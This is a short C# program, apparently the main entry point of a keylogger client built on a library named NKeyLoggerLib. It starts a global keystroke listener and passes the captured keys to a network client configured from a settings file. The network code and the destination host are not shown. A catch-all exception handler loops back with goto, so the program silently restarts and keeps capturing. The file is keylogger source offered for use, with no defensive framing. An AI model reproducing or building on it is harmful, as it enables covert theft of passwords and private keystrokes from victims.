using NKeyLoggerClient;
using NKeyLoggerLib;
class Program
{
    private static string settingsPath = "settings.txt";
    public static void Main(string[] args)
    {
    again:
        try
        {
            Setting setting = new Setting(settingsPath);
            Task<bool> listenTask = KeyListener.Instance.listenAsync();
            KeyListener.Instance.sender = new NetworkClient(setting);
            listenTask.Wait();
        }
        catch (Exception ex)
        {
            goto again;
        }
    }
}

